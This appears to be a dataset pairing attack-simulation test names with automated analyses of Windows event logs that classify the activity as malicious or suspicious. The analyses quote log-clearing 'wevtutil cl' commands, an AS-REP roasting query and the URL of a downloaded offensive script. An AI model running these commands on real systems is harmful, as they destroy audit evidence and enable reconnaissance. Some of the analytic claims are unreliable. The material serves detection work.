#### Sysmon Log Observations
1. **`wevtutil.exe` Execution:**
   - Repeated instances of `wevtutil.exe` were observed clearing logs from different channels (`Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`).
   - Executions were initiated from a high-integrity context (`High` integrity level), suggesting elevated privileges.

2. **Associated Processes:**
   - `conhost.exe` instances were often spawned as child processes of `wevtutil.exe`. This is typical behavior when running command-line-based operations.
   - The parent process for `wevtutil.exe` is `wsmprovhost.exe`, indicating remote management or a script execution environment.

3. **Miscellaneous Executions:**
   - `HOSTNAME.EXE` and `whoami.exe` were executed from the `C:\Windows\System32` directory, often with no further command-line arguments than necessary.
   - The execution of `cmd.exe` with registry query commands is noted. This execution pattern aligns with a user or script attempting to gather system configuration details.

#### System Log Observations
- **EventID 104 (Log File Cleared):**
  - Multiple instances indicate the clearing of event logs across several channels by `admin_test`.
  - The clearing of logs without a corresponding legitimate administrative task could be considered an attempt to cover tracks.

- **Synchronization of System Time:**
  - `svchost.exe` adjusted the system time, as noted in EventID 4616. However, no immediate correlation to security implications is found in this specific context.

#### Security Log Observations
- **EventID 1102 (Security Log Cleared):**
  - This indicates a security log clear event executed by the `admin_test` user.
  - Clearing security logs is a strong indicator of an attempt to obfuscate malicious activity or unauthorized access.

### Assessment
Based on the analysis of the logs, there are several signs of potential unauthorized or suspicious activity:
- The repeated execution of `wevtutil.exe` to clear various event logs is highly indicative of an attempt to cover tracks.
- All actions were conducted under a high-privilege account (`admin_test`), suggesting that either the credentials were misused, or there was an intention to perform unauthorized actions unnoticed.
- The presence of commands querying the registry and gathering system information supports this hypothesis.

Network Share Discovery via dir command,"### Detailed Analysis:

1. **Clearing of Event Logs**: 
   - There are multiple entries of the event logs being cleared, as seen in the System and Security logs. Specifically, `EventID: 104` and `1102` are indicative of log clearing activities.
   - `EventID: 104` in the System log shows entries for logs being cleared for both the ""System"" channel and ""Windows PowerShell"" channel by the user `admin_test`.
   - `EventID: 1102` in the Security log indicates that the Security logs were also cleared by the same user, `admin_test`.

2. **Use of `wevtutil`**:
   - Examination of Sysmon logs shows the `wevtutil.exe` process was executed multiple times with the `cl` (clear) command for multiple channels: Sysmon, Application, System, Security, and Windows PowerShell.
   - The user `SERVER002\admin_test` with a high integrity level executed these commands.

3. **Suspicious Usage of `cmd.exe`**:
   - The logs depict an execution of `cmd.exe` with network shares access on the local host `'127.0.0.1'` using directories like `c$`, `admin$`, and `IPC$`, which might indicate a probing action or lateral movement attempt.
   - Execution trace shows it was triggered from the subprocess hosted by `wsmprovhost.exe`, reflecting administrative execution potential.

4. **Process Activity**:
   - Several edge update activities (`MicrosoftEdgeUpdate.exe`) are recorded, such as update procedures which are usual unless conducted by an unexpected user or elevated permissions unexpectedly.
   - The user `admin_test` executing system utilities with escalated privileges raises suspicions further when considered alongside cleared logs.

### Threat Assessment:

- **Log Clearing**: This activity, especially in rapid succession across all major logs, is highly indicative of malicious behavior attempting to hide traces, often seen post exploitation or during lateral movements.
  
- **Privilege Misuse**: The user `admin_test` clearing logs is not typical operational behavior for an administrative user within a legitimate context, unless during specific maintenance with documentation.

- **Exploratory Commands**: The usage of command line to explore network shares on localhost addresses is atypical without prior context of diagnostic or audit purposes.

### Resolution:

- **MALICIOUS**: The combination of log clearing activities, atypical usage of privilege commands (`whoami`, `wevtutil`, network exploration), and elevated administrative operations suggests a coordinated effort to conceal malicious activities. This requires immediate attention to prevent potential threats, data exfiltration, or further compromise.

### Guidance:

1. **Immediate Response**:
   - **Isolate** the affected machine from the network to prevent further spread of potential malicious activities.
   - Conduct a forensic analysis on the machine to capture memory and disk images for detailed examination.

2. **Investigate**:
   - Verify the legitimacy of user `admin_test` and their recent activities.
   - Analyze recent software updates and installations to ensure they weren't tampered with or introduced as a vector.

3. **Preventive Measures**:
   - Review and tighten logging and alerting policies to detect similar actions of log modification or clearing attempts.
   - Enforce stricter access controls and audit logging around privileged accounts and operations.

4. **Review and Harden**:
   - Conduct a security review of administrative practices and endpoint protection measures in place.
   - Ensure all systems are updated and verify the integrity where possible to rule out compromised updates."
WinPwn - shareenumeration,"Based on the analysis of the provided Windows event logs, here's a detailed breakdown of the findings:

1. **Event Log Clearing:**
   - We observe multiple instances of event log clearing across different channels, including System, Windows PowerShell, and Security logs, executed using the `wevtutil cl` command. The commands are initiated by the user ""admin_test"" with a high integrity level.
   - Clearing event logs, especially Security logs, without a legitimate reason is highly suspicious and often indicative of an attempt to cover tracks following unauthorized or malicious activities.

2. **Suspicious PowerShell Activity:**
   - There are PowerShell events indicating the execution of a script from a GitHub repository associated with a user named ""S3cur3Th1sSh1t"". The script `WinPwn.ps1` is downloaded and executed.
   - Such behavior is suspicious, especially if the script source or its purpose is not pre-approved or known to be legitimate by the system administrators. This type of activity could potentially be dangerous as it might invoke scripts designed to enumerate and exploit vulnerabilities on the host.

3. **Unusual Process Execution:**
   - The logs show a series of executions involving `MicrosoftEdgeUpdate.exe` processes. While Edge updates can be legitimate, excessive and repetitive executions in conjunction with temporary directory utilization could be suspicious and potentially part of a stealthy backdoor or download/installation of unwanted applications or updates.

4. **Network Time Protocol Adjustment:**
   - There are entries indicating that the system time got adjusted. While this can sometimes be legitimate due to time synchronization processes or daylight saving adjustments, when associated with log clearing or other suspicious activities, it may indicate an attempt to hinder forensic analysis.

5. **Security Log Entry:**
   - Entry 1102 indicates that the Security log was cleared. This action combined with the use of `wevtutil` commands to clear logs confirms deliberate removal, increasing the likelihood of malicious intent.

**Assessment:**
- **SUSPICIOUS**: The combination of log clearing across various critical system logs, suspicious PowerShell activity downloading and executing scripts from an external repository, and unusual process executions suggests the activity requires further in-depth investigation.
  
**Recommendation for Next Steps:**
- Immediately conduct a thorough investigation on the user's activities and validate any justifications they may have for these actions.
- Perform anti-malware scans to rule out or confirm compromises.
- Isolate the machine to prevent potential spread or further malicious actions if malware is detected.
- Review the GitHub repository and script files being invoked via PowerShell to understand the script's intention and scope of influence.
- Consider resetting security credentials and tightening access controls, particularly for privileged accounts like ""admin_test"".
- Re-enable and ensure proper configuration of system monitoring and auditing, particularly for event logs.

This resolution assumes further investigation is warranted to determine the full extent and nature of the suspicious activities observed."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"### Detailed Analysis

Upon reviewing the provided Windows event logs, several indicators of suspicious activity suggest potential malicious behavior:

1. **PowerShell Activity**:
   - The logs indicate the execution of a PowerShell command with a suspicious query: 
     ```
     ""powershell.exe"" & {get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}}
     ```
     This command is used to query Active Directory for user accounts with the *DoesNotRequirePreAuth* flag set to true, which is often targeted by attackers to identify accounts that can be exploited through Kerberos-based attacks like ""AS-REP Roasting.""

2. **Event Log Clearing**:
   - The logs show multiple instances of event log clearing with:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Security`
   - These actions are performed by the `admin_test` user account. Clearing of logs is typically a tactic used by attackers to cover their tracks after executing malicious activities.

3. **Use of High-Integrity Level Processes**:
   - Many of the suspicious activities are executed with high integrity levels, indicating administrative privileges. Processes such as `wsmprovhost.exe` and `wevtutil.exe` are commonly leveraged to perform administrative actions, and their use here is indicative of potentially malicious intent.

4. **Exporting Event Logs**:
   - An instance of exporting Sysmon logs suggests potential data exfiltration, as indicated by:
     ```
     wevtutil.exe epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx
     ```

5. **Use of Conhost and Wevtutil Together**:
   - Frequent spawning of `conhost.exe` associated with `wevtutil.exe` could indicate script-based automation to manipulate or clear event logs, further suggesting illicit activity automation.

6. **Timing and Sequence of Events**:
   - The sequence of events occurs in rapid succession, typical of automated or scripted activity rather than legitimate administrative maintenance, which is usually slower and involves more interaction.

### Assessment

The pattern and nature of the events described above strongly suggest malicious activity. The specific use of PowerShell for querying potentially insecure user accounts, coupled with the systematic clearing of various event logs, points to activities designed to gather information and potentially prepare for further attacks while attempting to avoid detection.

### Resolution

**MALICIOUS**: The logs contain definitive signs of malicious activity.

### Guidance

1. **Immediate Actions**:
   - Isolate the affected system (""Server002"") to prevent further malicious activity or potential lateral movement across the network.
   - Reset passwords and review account usage for `admin_test` and any other accounts showing unusual activity or privilege escalation.

2. **Forensic Investigation**:
   - Perform a deeper forensic analysis of the machine to understand the full extent of the compromise, including reviewing unauthorized file access or data exfiltration.
   - Review other systems for similar patterns of behavior, especially those under administrative profiles.

3. **Review and Harden Security Measures**:
   - Implement enhanced monitoring for PowerShell usage and potential log clearing activities.
   - Ensure logging and alerting systems are robust and can detect similar patterns of behavior in the future.

4. **Comprehensive Incident Response**:
   - Engage with the incident response team to assess overall network security and mitigate risks of further exploitation.
   - Communicate findings with executive management to align on resolution and preventive measures.

These comprehensive steps should help contain the current breach, mitigate immediate threats, and improve the security posture to prevent future incidents."
List Internet Explorer Bookmarks using the command prompt,"Upon reviewing the given Windows event logs, I have identified several areas of concern that suggest potential malicious activity:

1. **Log Clearing Activity**:
   - **System and Security Event ID 104 and 1102**: The logs indicate that event log files for System, Windows PowerShell, and Security were cleared almost simultaneously on 2024-10-25. This behavior is highly suspicious as attackers often clear logs to cover their tracks after or during malicious activity. The actions were performed by a user with the name `admin_test`.

2. **Usage of `wevtutil`**:
   - Several events show the execution of the `wevtutil.exe` utility to clear event logs. This specific pattern, observed in Sysmon logs with EventID 1, involves the execution of `wevtutil` with the command-line argument `cl` followed by ""Application"", ""System"", and ""Security"" logs being cleared, which aligns closely with behaviors characteristic of clearing traces.

3. **Execution of Suspicious Command**:
   - **Sysmon Process Execution (EventID 1)**: The execution of `cmd.exe` with a command `dir /s /b %USERPROFILE%\Favorites` is logged. Using `cmd.exe` in this manner could indicate reconnaissance or enumeration activity within user profiles, potentially seeking sensitive data stored in browser favorites.

4. **Use of `whoami` and `hostname`**:
   - The logs indicate the execution of `whoami.exe` and `hostname.exe` from high integrity processes. While these commands are not inherently malicious and can serve legitimate administrative purposes, their execution by an admin user amidst other suspicious activities raises a red flag for an unusual sequence of reconnaissance commands.

5. **Unusual Time Changes**:
   - The Security EventID 4616 logs show changes in system time. Altering system time may correlate with attempts to disrupt time-based security controls or logs. However, it's noted that `Microsoft-Windows-Time-Service` EventID 35 correlated events show synchronization with `time.windows.com`, which in isolation could be benign.

6. **Execution from Non-standard Locations**:
   - Several processes, specifically those related to Microsoft Edge Update, are executed from temporary directories. While this in itself might be explained by pending updates, it further contributes to the pattern of varied unexpected process execution behaviors.

### Assessment:
The activity documented in these logs displays significant characteristics of actions commonly associated with malicious activity. These include log clearance, unexpected command executions, and time manipulation attempts. Although each of these activities alone could have a legitimate rationale, their confluence and timing strongly suggest a potential compromise.

### Resolution:
**MALICIOUS** - The series of activities observed in these logs, especially the clearing of event logs, use of `cmd.exe` for directory enumeration, and the run of administrative commands align with traits of account misuse or compromise. Immediate containment measures, further forensic analysis, and a full incident response investigation are recommended to confirm the breach extent and secure the environment. 

### Guidance:
- **Immediate Steps**:
  - Isolate the affected host from the network to prevent further potential data exfiltration or lateral movement.
  - Preserve all relevant logs and artifacts for further forensic investigation.
  - Review other systems for similar indicators of compromise.
  - Reset passwords and review privileges for `admin_test` and other privileged accounts.
- **Long Term Steps**:
  - Enhance monitoring on systems, especially for log clearance and abnormal command execution.
  - Review and reinforce access controls and logging to detect and respond to suspicious activities promptly.
  - Educate users on recognizing and reporting suspicious system behavior and potential phishing attempts."
TruffleSnout - Listing AD Infrastructure,"Upon reviewing the logs provided, several points of interest and concern have been identified, which suggest potentially malicious activity taking place on the machine ""Server002"". Here is a breakdown of the observed activities:

1. **Event Log Clearing:** 
   - The Security log indicates that event logs have been cleared by the user ""admin_test"". The Event ID 1102 pertains to the clearing of the event log, which is commonly seen as a step to cover tracks post-incident or during malicious activities. Additionally, in the System log, Event ID 104 shows clearing of specific logs (System and Windows PowerShell channels).
   
2. **Wevtutil Executions:**
   - Multiple instances of the command-line utility `wevtutil.exe` were used to clear various event logs (`Sysmon`, `Application`, `Security`, `Windows PowerShell`). Consistent use of this utility to clear logs further supports the suspicion of an attempt to hide potentially malicious activities.
   
3. **Presence of Suspicious Executables:**
   - The process `cmd.exe` was observed running a command referencing a suspicious executable `TruffleSnout.exe` located within the `Temp` directory. This file usage is abnormal and may indicate the execution of a possible malicious payload or script.

4. **Processes Initiated by Elevated User:**
   - Many of these suspicious activities are initiated by the account `SERVER002\admin_test`, which appears to have high integrity level and administrative privileges, allowing such operations.

5. **Consistent Event Timing:**
   - The events of clearing logs and suspicious command execution occurred in a very short time frame, indicating a concerted activity which could be indicative of malicious intent.

Given these observations, it is highly likely that these logs contain evidence of a compromise where the user `admin_test` is potentially misused or acting with malicious intent. We are dealing with activities indicative of an attacker attempting to cover their tracks by clearing relevant logs post-exploitation.

### Assessment and Resolution

**Resolution: MALICIOUS**

**Threats/Risks Identified:**
- Unauthorized or suspicious clearing of logs indicating potential trace covering.
- Execution of potentially unwanted applications from temporary file locations.

   - Isolate the affected machine from the network to prevent further potential damage or exfiltration of data.
   
2. **User Account Audit:**
   - Investigate the `admin_test` user account for unauthorized activities or signs of compromise.
   - Consider resetting credentials associated with this account.

3. **Forensic Analysis:**
   - Preserve the system's current state for a comprehensive forensic investigation.
   - Check for additional indicators of compromise (IOCs), such as unknown scheduled tasks, startup entries, or recently modified files.

4. **Log and Environment Restoration:**
   - Reassess and restore event logging mechanisms to ensure they are active and alerts configured for similar activities.

5. **Run System-wide Malware Scan:**
   - Conduct a full antivirus/malware scan using an updated signature database.

6. **Review Security Policies:**
   - Enhance monitoring entries and security posture to detect similar activities in the future and reduce potential attack vectors."
Query Registry with Powershell cmdlets,"### Analysis of Provided Logs:

1. **Application Log:**
   - The application log indicates that Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`). There is no anomaly in this log entry alone.

2. **Windows PowerShell Log:**
   - Multiple entries show execution of PowerShell with significant registry access. The executed script queries numerous startup locations in the registry. These commands are suspicious as they are often used by attackers to identify or create persistence mechanisms.
   - It is unusual for a user script to broadly access these registry entries unless performing a system audit or maintenance. Further investigation into the source of these commands is recommended to verify legitimacy.

3. **Sysmon Log:**
   - Frequent execution of utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and system processes such as `svchost.exe`, `conhost.exe`, and `findstr.exe`.
   - Notably, `wevtutil.exe` is used to clear System, Application, and Security logs (`cl` command), which is a red flag for potential log tampering, a common tactic to cover malicious activity tracks.
   - The execution of Microsoft Edge installer processes seems legitimate as they run under `NT AUTHORITY\SYSTEM` for system-level installation/update, and there is no immediate indication of tampered files or malicious parameters.
   - The clearing of logs (`wevtutil.exe cl`) by `SERVER002\admin_test` is highly suspicious and suggests a potential attempt to hide actions taken on the system, considering the associated Sysmon events that follow such action.

4. **System Log:**
   - Log entries also confirm that multiple event logs (System, Windows PowerShell) were cleared.
   - There is evidence of standard Windows updates occurring, specifically for Microsoft Defender Antivirus. These updates appear legitimate.

5. **Security Log:**
   - Log entry 1102 indicates the OS security log was cleared by `SERVER002\admin_test`. Combined with evidence from the Sysmon log, this action strongly suggests efforts to hide activities on the machine.
   - Multiple EventID 5379 entries suggest failed credential validations related to Microsoft online accounts, possibly indicative of credential access or other nefarious activities.

### Assessment:

- **Suspicion of Malicious Activity:** The combination of power user commands to access and potentially modify autostart registry keys, coupled with the clearing of essential logs (Security, Application, System), indicates significant cause for concern.

### Threats or Risks Identified:
- Potential unauthorized access or malicious automation interacting with system processes.
- Possible evidence tampering by clearing event logs, aiming to erase traces of activity.

### Guidance on How to Proceed:
- **Collect further evidence:** Investigate the origin and purpose of the PowerShell script, identifying its trigger and owner.
- **Assess log retention and backup:** Check if there are backups or centralized log storage systems for these logs to recover lost information.
- **Review user activity:** Audit `SERVER002\admin_test` account activities and permissions to identify any unauthorized actions or privilege misuse.
- **Conduct forensic analysis:** Consider a deeper forensic investigation on the affected system to detect any hidden or deleted traces of possibly malicious files or entries.

### Resolution: **MALICIOUS** 

This determination comes from the repeated pattern of event log clearing and the suspicious PowerShell command usage, which strongly suggests an attempt to obscure malicious actions and persistence within the operating system."
System Information Discovery,"**Analysis of Provided Windows Event Logs:**

1. **Repeated Execution of `wevtutil.exe` Tasks:**
   - The logs reveal several instances of the `wevtutil.exe` process, with a high integrity level, running commands to clear multiple event logs (`Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`).
   - Process executions indicate attempts to manipulate or clear logs, which is commonly associated with malicious activities aiming to cover tracks.

2. **Clear Evidence of Log Deletion:**
   - The System and Security event logs indicate log clearance events (`EventID: 104` and `1102`) by the user `SERVER002\\admin_test`.
   - Log clearance without legitimate tasks or prior notifications is suspicious, as it implies attempts to erase evidence of actions or intrusions.

3. **Time Manipulation:**
   - Events within the Kernel-General log (EventID: 1) display time adjustments, which aren't typical in benign scenarios. Time tampering can be used to confuse log timelines or avoid specific date-based audits.

4. **Unusual Command-Line Processes and Unexplained Tasks:**
   - The execution of `cmd.exe` with arguments querying system info and registry settings (`systeminfo & reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`) suggests information-gathering operations.
   - Coupling this with no apparent authorized administrative task provides a basis for potential reconnaissance conducted by the attacker using the compromised account.

5. **Elevated Privileges:** 
   - Logs demonstrate instances where the user `admin_test` has used high-privileged tokens, gaining abilities such as `SeDebugPrivilege`. This highly sensitive privilege is not typically used in regular operations and may indicate privilege escalation or preparation for advanced malicious actions.

6. **Presence of Process Execution under Service Accounts:**
   - Microsoft Edge Update tasks appear under `NT AUTHORITY\SYSTEM`. While this is normal for system updates, the context of concurrent malicious activity makes this relevant as a vector for persistence or misuse given elevated permissions.

**Assessment and Conclusion:**

Based on the above observations, the logs suggest potential malicious activity with a high degree of confidence. Elements such as unauthorized log clearing, privilege escalation, system and registry queries, and time manipulation point towards actions to gain and maintain presence, as well as to attempt cover-up traces of intrusion. This scenario, especially with these tailored and precise activities, aligns with post-exploitation behavior by malicious actors.

**Final Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment and Forensic Preservation:**
   - Isolate the affected system from the network to mitigate further compromise.
   - Ensure forensic images are captured for detailed offline analysis.

2. **Incident Response Investigation:**
   - Initiate an in-depth investigation into any potential breaches or unauthorized access on Server002 and any interconnected systems.
   - Review access and modify permissions for `admin_test` account and any privileged accounts.

3. **Patch and Secure:**
   - Verify the integrity and authenticity of Microsoft Update tasks and ensure all software, especially security-related tools, are patched.
   - Conduct a comprehensive review of system access logs, both before and after the date of detected anomalous activity.

4. **Policy Adjustments:**
   - Reinforce security policies focusing on access controls, logging procedures, and real-time behavioral alerts to detect similar events in the future.

5. **Engage Security Operations:**
   - Increase monitoring for indicators of similar activities across the organization.
   - Use threat intelligence to create alerts for activities resembling those found in this investigation."
Simulating MAZE Directory Enumeration,"Based on the review of the provided log entries, I will address key points and indicators of suspicious or malicious activity. 

### Key Observations:

1. **PowerShell Logs:**
   - The execution of a PowerShell script is observed that collects directory listings from various folders including ""Desktop,"" ""Downloads,"" ""Documents,"" and ""AppData"" locations and saves the output to a temporary file (`T1083Test5.txt`). This activity resembles an attempt to conduct system reconnaissance, which is a common technique in active attacks (potential use of MITRE ATT&CK tactic T1083 - File and Directory Discovery).

2. **Security Logs:**
   - The system logs and security logs have been cleared by a user named `admin_test`. The logs were cleared using the `wevtutil.exe` utility, which can be an indication of anti-forensic activity attempting to hide malicious activity (MITRE ATT&CK tactic T1070 - Indicator Removal on Host).

3. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` have been launched, which aligns with the clearing of event logs. The command execution pattern shows high integrity level execution, which implies admin-type privileges being utilized. This corresponds with event log deletion.
   - Other processes like `whoami.exe` and `HOSTNAME.EXE` were executed along with `PowerShell.exe`, which should be scrutinized for relevance, especially combined with activities of the PowerShell scripts observed.
   
4. **System and Application Logs:**
   - Routine updates and operations by EdgeUpdate processes are visible. These seem standard updates and not inherently suspect. However, their timing coinciding with log clearing could indicate they are co-opted in a larger suspicious activity, although they seem legitimate from evidence provided.

### Assessment and Recommendations:

**Assessment:**

- **Suspicious Activity Detected**: The combination of PowerShell activity for file and directory reconnaissance, along with the clearing of logs (Security and System) by an admin user and the execution of `wevtutil.exe`, is suspicious. The use of these techniques in tandem suggests an attempt to perform unauthorized reconnaissance while hiding tracks.

**Recommendations:**

1. **Further Investigation**: Conduct a thorough review of all processes executed by `admin_test` around the given timestamps, and examine network connections or unusual file creation/changes correlated in the same period.
   
2. **Preserve Evidence**: Ensure that current system logs are backed up and preserved for detailed forensic analysis. This would help establish a timeline of all activities.

3. **Audit Account Usage**: Verify and audit `admin_test` account usage, check for unauthorized access, and enforce tighter access controls.

4. **Patch and Update Systems**: Ensure the system's security patches and updates are current to avoid exploitation through known vulnerabilities.

5. **Monitor for Anomalies**: Implement continuous monitoring for similar PowerShell scripts, unusual command-line usage of `wevtutil.exe`, and further log clearing attempts.

**Resolution:**
- **SUSPICIOUS** - The activities need more investigation as they align with tactics commonly used in malicious activity but are not conclusively malicious without further evidence.

By categorizing the investigation as 'SUSPICIOUS', it indicates potential malicious activity that warrants deeper inspection to discern true intent and risk level."
System Service Discovery,"Upon reviewing the provided logs, there are several observations and events that stand out as suspicious and potentially indicative of malicious activity:

### Analysis of Logs:

1. **Log File Cleared Events**:
   - There are multiple events (Event ID 104) indicating that logs were cleared from the System, Security, and Windows PowerShell channels. This is performed by the user `admin_test` which is unusual and can be a sign of an attacker attempting to cover their tracks.

2. **Execution of `wevtutil.exe`**:
   - The `wevtutil.exe` command is used to clear event logs, and its execution is logged multiple times with high integrity (indicating administrative privileges). This process being run by `admin_test` aligns with the log clearing events identified.

3. **Frequent Use of Windows Utilities**:
   - Utilities such as `hostname.exe`, `whoami.exe`, `cmd.exe`, `tasklist.exe`, and `sc.exe` are executed in rapid succession. Such behavior is common during environment reconnaissance phases of a cyber attack.

4. **Use of Windows Management Instrumentation (WMI)**:
   - `WmiPrvSE.exe` execution is logged, which can be benign; however, in combination with other suspicious activities and considering the context, it warrants further investigation.

5. **Credential Access Attempt**:
   - There are several `Security-Auditing` events (Event ID 5379) indicating failed attempts to access credential information with ReturnCode 3221226021, suggesting unauthorized credential access attempts.

6. **Encrypted Processes**:
   - Several events include processes with potential encryption (`CommandLine` containing unknown actions). This could imply obfuscation attempts, which is suspicious.

### Assessment:
The collected events suggest actions typical of threat actor behavior:

- Clearing of logs indicates anti-forensic measures.
- Execution of system and administrative utilities likely indicates reconnaissance.
- Attempted credential access and suspicious process creation signals potential compromise.

### Resolution:
Given the combination of indicators, the resolution is **MALICIOUS**. The behaviors align consistently with post-exploitation activities within a Windows environment, and so immediate action is recommended.

### Guidance on How to Proceed:
- **Containment**: Isolate the affected host (Server002) from the network to prevent further propagation.
- **Investigation**: Conduct a full forensic investigation, capturing system memory and disk images for analysis.
- **Assessment**: Review admin credentials and reset passwords as a precaution, as they might be compromised.
- **Monitoring**: Enhance monitoring on the network for similar activities, particularly focusing on event log manipulation and unauthorized access attempts.
- **Review Security Procedures**: Ensure that logging configurations send important logs to a centralized location for analysis, reducing risks of log tampering on individual hosts.

Immediate action and thorough investigation are necessary to mitigate the risk and prevent further malicious activities."
Get-EventLog To Enumerate Windows Security Log,"After analyzing the provided Windows event logs, I have identified several suspicious activities that could indicate potential malicious intent:

1. **Event Log Clearing:**
   - The `wevtutil.exe` command-line tool was used to clear multiple event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell`), as evidenced by Event ID 104 in the System logs and correlated with Event ID 1102 in the Security logs. This action was initiated by the user `admin_test`.
   - Clearing event logs is often a tactic used by threat actors to cover their tracks after conducting malicious activities.

2. **Unusual Use of PowerShell:**
   - Multiple instances of PowerShell executing encoded commands and exporting event log data, suggest potentially suspicious activity aimed at data exfiltration or reconnaissance. The use of encoded commands can obscure the actual intent and make it challenging to understand what the scripts are doing at a glance.

3. **Commands Executed as SYSTEM:**
   - Several logs indicate processes executed with SYSTEM privileges (Event ID 4672 in the Security logs highlighting the use of elevated privileges like `SeDebugPrivilege`). This could indicate unauthorized privilege escalation.

4. **Associated Tools:**
   - Tools such as `wevtutil.exe` and `whoami.exe` were run, which in the context of clearing logs, could be part of a process chain led by a threat actor for maintaining anonymity or testing security configurations.

Based on these observations, the activities are consistent with attempts to hide malicious activities by clearing logs and leveraging elevated privileges to run potentially harmful commands. The use of `wevtutil.exe` to clear logs and `powershell.exe` to execute potentially harmful or exfiltrated scripts raises serious concerns.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine to prevent any further malicious actions or spread within the network.
- Conduct a thorough incident response investigation to determine the source and extent of the compromise.
- Review access logs and monitor for any similar suspicious activities across other systems in the network.
- Reset credentials and elevate monitoring on accounts involved in these activities, especially privileged accounts like `admin_test`.
- Ensure all security patches and antivirus signatures are up to date.
- Educate users about the risks of executing unauthorized scripts or commands with potentially dangerous capabilities.
- Consider engaging external cybersecurity professionals to assist in a more comprehensive analysis and remediation effort."
Enumerate all accounts via PowerShell (Local),"Upon reviewing the provided logs, there are several key observations and concerns that indicate potentially malicious activity:

1. **Log Clearance Events**: 
   - The System logs show repeated log clearance events at 20:40:10 and 20:40:11, related to system logs and the PowerShell channel. Log clearance is often a method used by attackers to cover their tracks and is a strong indicator of malicious activity.

2. **Use of PowerShell**:
   - The Security logs and Sysmon logs illustrate commands executed via PowerShell. The commands involve listing users, groups, and directories which often aligns with reconnaissance activities. PowerShell's use for such purposes is a common characteristic in many attack strategies due to its powerful capabilities and ability to execute scripts.

3. **Unusual Process Activity**:
   - Execution of `wevtutil.exe` and `cmdkey.exe`, alongside process clear commands and credential enumeration, suggests suspicious behavior, potentially aimed at clearing logs or accessing credentials without authorization. The execution of `wevtutil.exe` to clear log channels is another red flag.

4. **Audit and Modification Events**:
   - Security event 4799 entries reflect altering or querying user groups, which could be an attempt to gain elevated privileges or modify access rights for further exploitation.

5. **System Time Manipulation**:
   - Kernel-General log entries showing time being set back slightly may indicate an attempt to manipulate logs for obfuscation purposes.

6. **Pattern of Execution**:
   - Processes such as `whoami.exe`, `hostname.exe`, and `cmdkey.exe` showing integrity level as high suggest potentially unwanted elevated actions being performed by the user ""admin_test.""

Given the presence of these indicators — particularly log clearance, the execution of PowerShell scripts for reconnaissance, and suspicious process activities — there is strong evidence pointing towards malicious intent.

**Resolution: MALICIOUS**

---

**Guidance on How to Proceed**:

It's crucial to make sure that all activities and response efforts are documented for post-incident analysis and compliance considerations."
Azure - Dump Subscription Data with MicroBurst,"Upon reviewing the provided logs, several suspicious activities appear which indicate potential malicious activity. Here's a detailed analysis:

1. **Log Clearance Activity:**
   - Multiple events indicate that the Windows event logs on the host `Server002` were cleared (`EventID 104` and `EventID 1102`). The logs were cleared by the user `admin_test` across different channels (`System`, `Windows PowerShell`, `Security`). Clearing event logs is a typical tactic used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - There are extensive PowerShell activities logged involving the execution of potentially malicious scripts. The logs indicate the use of PowerShell to import potentially malicious modules (such as `Get-AzDomainInfo.ps1`) and manage credentials, which could signify attempts to gain unauthorized access or gather domain information.
   - The use of embedded PowerShell scripts and references to potential Azure information within these scripts suggest reconnaissance or data collection activities, possibly part of an attack simulation toolkit or test such as Atomic Red Team.

3. **CompatTelRunner.exe Execution:**
   - The `CompatTelRunner.exe` process is involved in multiple suspicious activities, including querying user accounts and having system-level access. The frequent execution of this process could indicate it being leveraged for telemetry or reconnaissance purposes under malicious use.

4. **System Access and Privilege Escalation:**
   - There are events showing high privilege usages, such as `SeDebugPrivilege` and others, which infer potentially unauthorized escalations of privileges. 

5. **Application Installations Executed System-wide:**
   - Various installations and updates are associated with Microsoft Edge, executed in a way that might indicate abuse of legitimate processes to maintain persistence or execute arbitrary code.

Upon analyzing these findings, the overall resolution of these logs should be categorized as **MALICIOUS**. The evidence suggests coordinated efforts to hide tracks by clearing logs, potential credential misuse and attempts to maintain or escalate privileges, and signs of abnormal PowerShell activity orchestrated likely by a threat simulation or testing tool for nefarious purposes.

**Guidance on How to Proceed:**
- A full forensic investigation should be carried out on `Server002` to determine the extent of the compromise and data exfiltration.
- Ensure that all passwords associated with privileged accounts such as `admin_test` are changed immediately.
- Review and reinforce security monitoring solutions to detect and prevent future unauthorized access attempts.
- Inspect the network for other signs of compromise and evaluate lateral movement within the infrastructure.
- Engage with your incident response team to mitigate and strengthened security posture post-incident."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"Based on the analysis of the provided event logs, the following observations and assessments have been made:

### **Suspicious Behavior Identified:**
1. **Cleared Event Logs**: 
   - Sysmon logs indicate the use of `wevtutil.exe` to clear various logs like Sysmon, Application, System, Security, and PowerShell. This is a common tactic used by threat actors to cover their tracks as it attempts to delete forensic evidence of their activities.
   - Specific events indicating cleared logs:
     - **EventID 104** in the System log, triggered by `wevtutil.exe` to clear event logs.
     - **EventID 1102** in the Security log, also associated with the clearing of logs.

2. **Suspicious PowerShell Activity**:
   - Command line usage of PowerShell to download and execute a script from an external source: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1`.
     - This script, `Invoke-SharpUp`, is part of a repository known for actions related to offensive security capabilities.
   - Altered execution path observed through events in the PowerShell logs showing suspicious command lines being executed.

3. **Integrity Level**:
   - Multiple processes were executed at a high integrity level, suggesting the processes had elevated privileges, which could be used for privilege escalation attacks.

4. **Miscellaneous Activity**:
   - Frequent spawning of `conhost.exe` related to various `wevtutil.exe` activities, which may indicate further suspicious command-line interactions.

### **Evaluation:**
